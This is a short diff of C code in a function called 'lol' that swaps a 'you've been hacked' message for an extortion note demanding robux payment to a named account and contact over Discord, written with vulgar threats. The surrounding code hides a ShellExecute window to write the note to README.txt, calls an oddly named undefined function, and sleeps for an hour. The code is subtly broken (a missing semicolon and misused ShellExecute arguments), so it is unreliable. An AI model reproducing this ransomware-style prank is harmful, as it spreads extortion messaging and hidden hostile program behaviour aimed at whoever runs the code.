@@ -18,7 +18,7 @@ void lol()
         int x;
         int y;
         int duration = 3600000;
-        char message[] = "you've been hacked by the ohio rizzler gods no cap all facts fr!!";
+        char message[] = "you've been hacked by the ohio rizzler gods no cap all facts fr!! if u dont want yer pc being buttfucked you must pay this account (BugBountyTestRoblox) 124125 robux for more information add me on discord (jetdesroyer444)";
         ShellExecute(NULL, NULL, L"echo %c > README.txt", NULL, NULL, SW_HIDE, message);
         maozedongthecompooter()
         Sleep(duration);
